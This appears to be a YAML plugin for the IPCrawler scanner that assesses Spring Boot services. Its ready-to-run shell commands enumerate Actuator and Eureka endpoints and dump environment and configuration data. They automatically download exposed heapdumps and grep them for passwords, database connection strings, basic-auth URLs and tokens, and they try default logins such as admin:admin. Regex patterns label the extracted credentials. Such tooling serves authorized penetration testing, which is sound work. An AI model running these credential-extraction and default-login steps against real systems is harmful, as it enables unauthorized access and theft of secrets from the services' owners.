metadata:
  name: Spring Boot Actuator Security Scanner
  description: Comprehensive Spring Boot security assessment with automated credential
    extraction and vulnerability detection
  type: servicescan
  priority: 5
  version: '1.0'
  author: IPCrawler YAML Plugin System
conditions:
  services:
    include:
    - ^http
    - ^https
    - ^unknown$
    exclude:
    - ^nacn_http$
  ports:
    include:
    - 80
    - 443
    - 8080
    - 8443
    - 9000
    - 3000
  when:
    custom_condition: spring_boot_detected or force_scan
options:
- name: force_scan
  type: boolean
  default: false
  help: Force Spring Boot enumeration on all HTTP services regardless of detection
- name: threads
  type: integer
  default: 10
  help: Number of threads for endpoint enumeration
- name: timeout
  type: integer
  default: 5
  help: Request timeout in seconds
- name: vhost_mode
  type: choice
  choices:
  - all
  - best
  - smart
  default: smart
  help: How to handle multiple discovered hostnames
- name: extract_heapdump
  type: boolean
  default: true
  help: Automatically extract credentials from accessible heapdumps
- name: common_paths
  type: string
  default: /,/actuator,/actuator/health,/actuator/info,/actuator/env,/actuator/beans,/actuator/configprops,/actuator/mappings,/actuator/metrics,/actuator/heapdump,/actuator/threaddump,/actuator/trace,/actuator/dump,/actuator/features,/actuator/loggers,/actuator/shutdown,/actuator/refresh,/manage,/management,/admin,/health,/info,/status,/eureka,/eureka/apps,/eureka/status,/v2/apps,/eureka/apps/delta,/error,/trace,/dump,/autoconfig,/beans,/configprops
  help: Common Spring Boot and Eureka management endpoints to check (comma-separated)
execution:
  commands:
  - name: spring_boot_detection
    condition: 'true'
    command: "echo \"=== Spring Boot Detection Phase ===\" &&\nfor hostname in {all_hostnames};\
      \ do\n  echo \"Testing hostname: $hostname\" &&\n  # Quick actuator endpoint\
      \ check\n  curl -s -I -m {timeout} {http_scheme}://$hostname:{port}/actuator\
      \ 2>&1 | head -5 &&\n  # Quick main page check for Spring indicators\n  curl\
      \ -s -m {timeout} {http_scheme}://$hostname:{port}/ 2>&1 | head -10 | grep\
      \ -iE \"(spring|boot|whitelabel|eureka|netflix)\" || true\ndone\n"
    timeout: 60
    output_file: '{protocol}_{port}_{http_scheme}_spring_detection.txt'
  - name: actuator_endpoint_enumeration
    condition: spring_boot_detected
    command: "echo \"=== Spring Boot Actuator Endpoint Enumeration ===\" &&\nfor hostname\
      \ in {all_hostnames}; do\n  echo \"=== Scanning hostname: $hostname ===\" &&\n\
      \  for endpoint in {common_paths}; do\n    echo \"=== Checking: {http_scheme}://$hostname:{port}$endpoint\
      \ ===\" &&\n    if [[ \"$endpoint\" == *\"heapdump\"* || \"$endpoint\" == *\"\
      threaddump\"* ]]; then\n      # Use HEAD request for binary endpoints\n    \
      \  curl -s -I -m {timeout} \"{http_scheme}://$hostname:{port}$endpoint\" -H\
      \ \"User-Agent: Mozilla/5.0 (compatible; IPCrawler)\" 2>&1 || echo \"Connection\
      \ failed\"\n      echo \"Note: Using HEAD request to avoid binary download\"\
      \n    else\n      # Normal GET request for text endpoints\n      curl -s -m\
      \ {timeout} \"{http_scheme}://$hostname:{port}$endpoint\" -H \"User-Agent:\
      \ Mozilla/5.0 (compatible; IPCrawler)\" 2>&1 || echo \"Connection failed\"\n\
      \    fi\n    echo \"\"\n  done\ndone\n"
    timeout: 300
    output_file: '{protocol}_{port}_{http_scheme}_spring_endpoints.txt'
  - name: environment_exposure_check
    condition: spring_boot_detected
    command: "echo \"=== Environment Variable Exposure Check ===\" &&\nfor hostname\
      \ in {all_hostnames}; do\n  echo \"=== Testing /env endpoint on $hostname ===\"\
      \ &&\n  curl -s -m {timeout} {http_scheme}://$hostname:{port}/env 2>&1 &&\n\
      \  echo \"=== Testing /actuator/env on $hostname ===\" &&\n  curl -s -m {timeout}\
      \ {http_scheme}://$hostname:{port}/actuator/env 2>&1 &&\n  echo \"=== Testing\
      \ with different headers on $hostname ===\" &&\n  curl -s -m {timeout} -H\
      \ \"Accept: text/plain\" {http_scheme}://$hostname:{port}/actuator/env 2>&1\n\
      done\n"
    timeout: 120
    output_file: '{protocol}_{port}_{http_scheme}_spring_env.txt'
  - name: config_properties_check
    condition: spring_boot_detected
    command: "echo \"=== Configuration Properties Exposure Check ===\" &&\nfor hostname\
      \ in {all_hostnames}; do\n  echo \"=== Testing /actuator/configprops on $hostname\
      \ ===\" &&\n  curl -s -m {timeout} {http_scheme}://$hostname:{port}/actuator/configprops\
      \ 2>&1 &&\n  echo \"=== Testing /configprops on $hostname ===\" &&\n  curl -s\
      \ -m {timeout} {http_scheme}://$hostname:{port}/configprops 2>&1\ndone\n"
    timeout: 120
    output_file: '{protocol}_{port}_{http_scheme}_spring_config.txt'
  - name: heapdump_credential_extraction
    condition: spring_boot_detected and extract_heapdump
    command: "echo \"=== Heapdump Credential Extraction ===\" &&\nfor hostname in\
      \ {all_hostnames}; do\n  echo \"=== Testing heapdump on $hostname ===\" &&\n\
      \  hostname_label=$(echo \"$hostname\" | tr '.:' '__') &&\n  heapdump_check=$(curl\
      \ -s -I -m {timeout} {http_scheme}://$hostname:{port}/actuator/heapdump 2>&1)\
      \ &&\n  echo \"$heapdump_check\" &&\n  if echo \"$heapdump_check\" | grep -qi\
      \ \"200 ok\"; then\n    echo \"\U0001F6A8 CRITICAL: Heapdump endpoint accessible\
      \ on $hostname!\" &&\n    echo \"\U0001F50D Downloading and extracting credentials...\"\
      \ &&\n    heapdump_file=\"{scandir}/heapdump_{port}_$hostname_label.hprof\"\
      \ &&\n    creds_file=\"{scandir}/EXTRACTED_CREDENTIALS_{port}_$hostname_label.txt\"\
      \ &&\n    if curl -s -m 300 \"{http_scheme}://$hostname:{port}/actuator/heapdump\"\
      \ -o \"$heapdump_file\" 2>/dev/null; then\n      if [ -f \"$heapdump_file\"\
      \ ]; then\n        echo \"HEAPDUMP_EXTRACTION_START\" &&\n        # Extract\
      \ password= patterns\n        strings \"$heapdump_file\" | grep -E \"password=\"\
      \ | head -20 | while read line; do\n          echo \"CREDENTIAL_FOUND:PASSWORD:$line\"\
      \n        done &&\n        # Extract PWD environment variables\n        strings\
      \ \"$heapdump_file\" | grep -E \"PWD\" | head -15 | while read line; do\n  \
      \        echo \"CREDENTIAL_FOUND:PWD:$line\"\n        done &&\n        # Extract\
      \ Eureka/microservice credentials\n        strings \"$heapdump_file\" | grep\
      \ -E \"(EurekaSrvr.*@|://.*:.*@.*:8761)\" | head -10 | while read line; do\n\
      \          echo \"CREDENTIAL_FOUND:EUREKA:$line\"\n        done &&\n       \
      \ # Extract HTTP Basic Auth URLs\n        strings \"$heapdump_file\" | grep\
      \ -E \"://[^:]+:[^@]+@[^/]+\" | head -15 | while read line; do\n          echo\
      \ \"CREDENTIAL_FOUND:HTTP_AUTH:$line\"\n        done &&\n        # Extract database\
      \ connection strings\n        strings \"$heapdump_file\" | grep -E \"jdbc:[^:]+://[^:]*:[^@]*@\"\
      \ | head -10 | while read line; do\n          echo \"CREDENTIAL_FOUND:DATABASE:$line\"\
      \n        done &&\n        # Extract user= patterns\n        strings \"$heapdump_file\"\
      \ | grep -E \"user=\" | head -15 | while read line; do\n          echo \"CREDENTIAL_FOUND:USER:$line\"\
      \n        done &&\n        echo \"HEAPDUMP_EXTRACTION_END\" &&\n        echo\
      \ \"SUCCESS: Credentials extracted from heapdump\"\n      else\n        echo\
      \ \"ERROR: Heapdump file not created\"\n      fi\n    else\n      echo \"ERROR:\
      \ Failed to download heapdump\"\n    fi\n  else\n    echo \"❌ Heapdump endpoint\
      \ not accessible on $hostname\"\n  fi\ndone\n"
    timeout: 600
    output_file: '{protocol}_{port}_{http_scheme}_heapdump_extraction.txt'
  - name: authentication_bypass_test
    condition: spring_boot_detected
    command: "echo \"=== Authentication Bypass Testing ===\" &&\nfor hostname in {all_hostnames};\
      \ do\n  echo \"=== Testing admin:admin on $hostname ===\" &&\n  curl -v -s -m\
      \ {timeout} -u admin:admin {http_scheme}://$hostname:{port}/ 2>&1 &&\n  echo\
      \ \"=== Testing default:default on $hostname ===\" &&\n  curl -v -s -m {timeout}\
      \ -u default:default {http_scheme}://$hostname:{port}/ 2>&1 &&\n  echo \"===\
      \ Testing empty credentials on $hostname ===\" &&\n  curl -v -s -m {timeout}\
      \ -u : {http_scheme}://$hostname:{port}/ 2>&1\ndone\n"
    timeout: 120
    output_file: '{protocol}_{port}_{http_scheme}_auth_bypass.txt'
  - name: error_page_disclosure
    condition: spring_boot_detected
    command: "echo \"=== Error Page Information Disclosure ===\" &&\nfor hostname\
      \ in {all_hostnames}; do\n  echo \"=== Testing /error endpoint on $hostname\
      \ ===\" &&\n  curl -v -m {timeout} {http_scheme}://$hostname:{port}/error\
      \ -H \"User-Agent: Mozilla/5.0 (compatible; IPCrawler)\" 2>&1\ndone\n"
    timeout: 60
    output_file: '{protocol}_{port}_{http_scheme}_error_disclosure.txt'
  manual_commands:
  - description: (spring-boot) Basic connectivity and actuator test
    command: curl -s -I {http_scheme}://{hostname}:{port}/actuator
  - description: (spring-boot) Check all common actuator endpoints
    command: "for endpoint in /actuator /actuator/health /actuator/info /actuator/env\
      \ /actuator/beans /actuator/heapdump; do\n  echo \"=== $endpoint ===\";\n  curl\
      \ -s {http_scheme}://{hostname}:{port}$endpoint;\n  echo \"\";\ndone\n"
  - description: '(spring-boot) CRITICAL: Download and analyze heapdump for credentials'
    command: 'curl -s {http_scheme}://{hostname}:{port}/actuator/heapdump -o heapdump_{port}.hprof
      &&

      echo "=== Password patterns ===" &&

      strings heapdump_{port}.hprof | grep "password=" | head -20 &&

      echo "=== PWD environment variables ===" &&

      strings heapdump_{port}.hprof | grep "PWD" | head -15 &&

      echo "=== Eureka/microservice credentials ===" &&

      strings heapdump_{port}.hprof | grep -iE "EurekaSrvr.*@|://.*:.*@.*:8761" |
      head -10 &&

      echo "=== User/password pairs ===" &&

      strings heapdump_{port}.hprof | grep -iE "{password=.*&.*user=|user=.*password=}"
      | head -10 &&

      echo "=== HTTP Basic Auth URLs ===" &&

      strings heapdump_{port}.hprof | grep -iE "://.*:.*@" | head -10 &&

      echo "=== Database connection strings ===" &&

      strings heapdump_{port}.hprof | grep -i "jdbc:" | head -10 &&

      echo "=== API keys and tokens ===" &&

      strings heapdump_{port}.hprof | grep -iE "(api.?key|secret|token)" | head -15

      '
  - description: (spring-boot) Extract environment variables and configuration
    command: 'curl -s {http_scheme}://{hostname}:{port}/actuator/env > spring_env.json
      &&

      curl -s {http_scheme}://{hostname}:{port}/actuator/configprops > spring_config.json
      &&

      echo "Environment and configuration downloaded"

      '
  - description: (spring-boot) Test common default credentials
    command: 'curl -s -u admin:admin {http_scheme}://{hostname}:{port}/ &&

      curl -s -u admin:password {http_scheme}://{hostname}:{port}/ &&

      curl -s -u spring:spring {http_scheme}://{hostname}:{port}/

      '
  - description: (spring-boot) Check for management interfaces
    command: 'curl -s {http_scheme}://{hostname}:{port}/manage &&

      curl -s {http_scheme}://{hostname}:{port}/admin &&

      curl -s {http_scheme}://{hostname}:{port}/management

      '
  - description: (spring-boot) Eureka service discovery enumeration
    command: 'curl -s {http_scheme}://{hostname}:{port}/eureka/apps &&

      curl -s {http_scheme}://{hostname}:{port}/v2/apps &&

      curl -s {http_scheme}://{hostname}:{port}/eureka/status

      '
output:
  patterns:
  - pattern: (?i)spring-boot[/-]?v?(\d+\.\d+\.\d+)
    description: Spring Boot Framework v{match1} detected - modern Java microservice
      platform
    severity: info
    category: framework
  - pattern: (?i)whitelabel.error.page|default.error.view
    description: Spring Boot Default Error Page exposed - potential information disclosure
    severity: medium
    category: information_disclosure
  - pattern: (?i)org\.springframework\.boot
    description: Spring Boot Framework classes detected - Java enterprise application
    severity: info
    category: framework
  - pattern: (?i)eureka.instance.hostname[:\s]*([^\s,\n]+)
    description: 'Netflix Eureka Service Discovery - hostname: {match1}'
    severity: info
    category: service_discovery
  - pattern: (?i)eureka.client.service-url.defaultZone[:\s]*([^\s,\n]+)
    description: 'Eureka Default Zone URL: {match1} - service registry endpoint'
    severity: medium
    category: service_discovery
  - pattern: (?i)"name"\s*:\s*"([^"]*eureka[^"]*)"
    description: 'Eureka Service Instance: {match1} - microservice registration'
    severity: info
    category: service_discovery
  - pattern: (?i)netflix.eureka|service.registry
    description: Netflix Eureka Service Registry detected - microservices architecture
    severity: info
    category: service_discovery
  - pattern: (?i)"/actuator/env"
    description: 'CRITICAL: Spring Actuator /env endpoint exposed - environment variables
      disclosure'
    severity: critical
    category: information_disclosure
  - pattern: (?i)"/actuator/configprops"
    description: 'CRITICAL: Spring Actuator /configprops endpoint exposed - configuration
      properties disclosure'
    severity: critical
    category: information_disclosure
  - pattern: (?i)"/actuator/beans"
    description: 'WARNING: Spring Actuator /beans endpoint exposed - application context
      disclosure'
    severity: high
    category: information_disclosure
  - pattern: (?i)"/actuator/mappings"
    description: 'INFO: Spring Actuator /mappings endpoint exposed - URL mappings
      disclosure'
    severity: medium
    category: information_disclosure
  - pattern: (?i)"/actuator/health"
    description: 'INFO: Spring Actuator /health endpoint exposed - application health
      status'
    severity: info
    category: monitoring
  - pattern: (?i)"/actuator/info"
    description: 'INFO: Spring Actuator /info endpoint exposed - application information'
    severity: info
    category: monitoring
  - pattern: (?i)"/actuator/metrics"
    description: 'INFO: Spring Actuator /metrics endpoint exposed - application metrics'
    severity: info
    category: monitoring
  - pattern: (?i)"/actuator/trace"
    description: 'CRITICAL: Spring Actuator /trace endpoint exposed - HTTP request
      traces'
    severity: critical
    category: information_disclosure
  - pattern: (?i)"/actuator/dump"
    description: 'CRITICAL: Spring Actuator /dump endpoint exposed - thread dump disclosure'
    severity: critical
    category: information_disclosure
  - pattern: (?i)"/actuator/heapdump"
    description: 'CRITICAL: Spring Actuator /heapdump endpoint exposed - memory dump
      disclosure'
    severity: critical
    category: information_disclosure
  - pattern: (?i)management\.endpoints\.web\.exposure\.include[:\s=]*([^\s,\n]+)
    description: 'Spring Actuator Endpoints Enabled: {match1}'
    severity: medium
    category: configuration
  - pattern: (?i)spring.security.oauth2|spring-security-oauth
    description: Spring Security OAuth2 detected - authentication/authorization framework
    severity: info
    category: security
  - pattern: (?i)JSESSIONID=([A-F0-9]+)
    description: 'Java Session ID detected: {match1} - session management active'
    severity: info
    category: session
  - pattern: (?i)X-Frame-Options:\s*([^\n]+)
    description: 'X-Frame-Options security header: {match1}'
    severity: info
    category: security_headers
  - pattern: (?i)server:\s*apache-coyote.*tomcat[/-]?(\d+\.\d+)
    description: Apache Tomcat v{match1} detected - Java servlet container
    severity: info
    category: server
  - pattern: (?i)server:\s*jetty[/-]?(\d+\.\d+)
    description: Eclipse Jetty v{match1} detected - Java HTTP server
    severity: info
    category: server
  - pattern: (?i)server:\s*undertow[/-]?(\d+\.\d+)
    description: Undertow v{match1} detected - Java web server (WildFly)
    severity: info
    category: server
  - pattern: (?i)java.version[:\s=]*([^\s,\n]+)
    description: 'Java Runtime Version: {match1}'
    severity: info
    category: version
  - pattern: (?i)java.vendor[:\s=]*([^\s,\n]+)
    description: 'Java Vendor: {match1}'
    severity: info
    category: version
  - pattern: (?i)spring.datasource.url[:\s=]*([^\s,\n]+)
    description: 'CRITICAL: Database Connection String exposed: {match1}'
    severity: critical
    category: credentials
  - pattern: (?i)spring.datasource.username[:\s=]*([^\s,\n]+)
    description: 'WARNING: Database Username exposed: {match1}'
    severity: high
    category: credentials
  - pattern: (?i)spring.profiles.active[:\s=]*([^\s,\n]+)
    description: 'Spring Active Profiles: {match1} - environment configuration'
    severity: info
    category: configuration
  - pattern: password=([^&\s,\n}]+)
    description: 'CRITICAL: Password credential found in heapdump: {match1}'
    severity: critical
    category: credentials
  - pattern: '{password=([^&]+)&[^}]*user=([^}]+)}'
    description: 'CRITICAL: User/Password pair found: user={match2}, password={match1}'
    severity: critical
    category: credentials
  - pattern: EurekaSrvr:([^@]+)@([^:]+):(\d+)
    description: 'CRITICAL: Eureka Server credentials found: password={match1} host={match2}:{match3}'
    severity: critical
    category: credentials
  - pattern: http://([^:]+):([^@]+)@([^:]+):8761
    description: 'CRITICAL: Eureka HTTP Basic Auth: user={match1}, password={match2},
      server={match3}:8761'
    severity: critical
    category: credentials
  - pattern: PWD=([^\s,\n]+)
    description: 'INFO: PWD environment variable: {match1}'
    severity: info
    category: environment
  - pattern: user=([^&\s,\n}]+)
    description: 'INFO: Username found in memory: {match1}'
    severity: info
    category: credentials
  - pattern: username=([^&\s,\n}]+)
    description: 'INFO: Username found in memory: {match1}'
    severity: info
    category: credentials
  - pattern: jdbc:[^:]+://([^:]+):([^@]+)@([^:/]+)
    description: 'CRITICAL: JDBC credentials found: user={match1}, password={match2},
      host={match3}'
    severity: critical
    category: credentials
  - pattern: '://([^:]+):([^@]+)@([^:/]+):'
    description: 'CRITICAL: URL credentials found: user={match1}, password={match2},
      host={match3}'
    severity: critical
    category: credentials
  - pattern: CREDENTIAL_FOUND:PASSWORD:(.+)
    description: '🔥 EXTRACTED PASSWORD FROM HEAPDUMP: {match1}'
    severity: critical
    category: extracted_credentials
  - pattern: CREDENTIAL_FOUND:PWD:(.+)
    description: '🔥 EXTRACTED PWD VARIABLE FROM HEAPDUMP: {match1}'
    severity: high
    category: extracted_credentials
  - pattern: CREDENTIAL_FOUND:EUREKA:(.+)
    description: '🔥 EXTRACTED EUREKA CREDENTIALS FROM HEAPDUMP: {match1}'
    severity: critical
    category: extracted_credentials
  - pattern: CREDENTIAL_FOUND:HTTP_AUTH:(.+)
    description: '🔥 EXTRACTED HTTP AUTH URL FROM HEAPDUMP: {match1}'
    severity: critical
    category: extracted_credentials
  - pattern: CREDENTIAL_FOUND:DATABASE:(.+)
    description: '🔥 EXTRACTED DATABASE CONNECTION FROM HEAPDUMP: {match1}'
    severity: critical
    category: extracted_credentials
  - pattern: CREDENTIAL_FOUND:USER:(.+)
    description: '🔥 EXTRACTED USERNAME FROM HEAPDUMP: {match1}'
    severity: high
    category: extracted_credentials
  - pattern: 'SUCCESS: Credentials extracted from heapdump'
    description: ✅ HEAPDUMP CREDENTIAL EXTRACTION COMPLETED SUCCESSFULLY
    severity: critical
    category: extraction_success
  - pattern: (?i)spring.cloud.config.server
    description: Spring Cloud Config Server detected - centralized configuration management
    severity: medium
    category: cloud
  - pattern: (?i)spring.cloud.gateway
    description: Spring Cloud Gateway detected - API gateway service
    severity: info
    category: cloud
  - pattern: (?i)spring.cloud.consul|spring.cloud.zookeeper
    description: Spring Cloud Service Discovery detected - distributed systems
    severity: info
    category: cloud
  - pattern: (?i)spring.h2.console.enabled[:\s=]*true
    description: 'CRITICAL: H2 Database Console enabled - potential RCE vulnerability'
    severity: critical
    category: vulnerability
  - pattern: (?i)management.security.enabled[:\s=]*false
    description: 'CRITICAL: Spring Actuator security disabled - unrestricted access'
    severity: critical
    category: vulnerability
  - pattern: (?i)endpoints.env.enabled[:\s=]*true
    description: 'WARNING: Environment endpoint enabled - potential information disclosure'
    severity: high
    category: vulnerability
  - pattern: (?i)HTTP/[12]\.[01]\s+200.*actuator
    description: 'CRITICAL: Spring Actuator endpoint accessible via HTTP (200 OK)'
    severity: critical
    category: http_status
  - pattern: (?i)HTTP/[12]\.[01]\s+403.*actuator
    description: 'WARNING: Spring Actuator endpoint access forbidden but exists (403
      Forbidden)'
    severity: medium
    category: http_status
  - pattern: (?i)HTTP/[12]\.[01]\s+401.*actuator
    description: 'WARNING: Spring Actuator endpoint requires authentication (401 Unauthorized)'
    severity: medium
    category: http_status
  technology_detection:
  - pattern: (?i)Spring.*Boot[\s]*([\d\.]+)
    technology: Spring Boot
    version_group: 1
  - pattern: (?i)Apache.*Tomcat[/-]([\d\.]+)
    technology: Apache Tomcat
    version_group: 1
  - pattern: (?i)Eclipse.*Jetty[/-]([\d\.]+)
    technology: Eclipse Jetty
    version_group: 1
  - pattern: (?i)Undertow[/-]([\d\.]+)
    technology: Undertow
    version_group: 1
  - pattern: (?i)Netflix.*Eureka
    technology: Netflix Eureka
  - pattern: (?i)Spring.*Cloud
    technology: Spring Cloud
requirements:
  tools:
  - name: curl
    check_command: curl --version
    install_hint: apt-get install curl
  - name: strings
    check_command: strings --version
    install_hint: apt-get install binutils
debug:
  log_level: info
  trace_decisions: true
  show_command_output: false
variables:
  timeout: 300
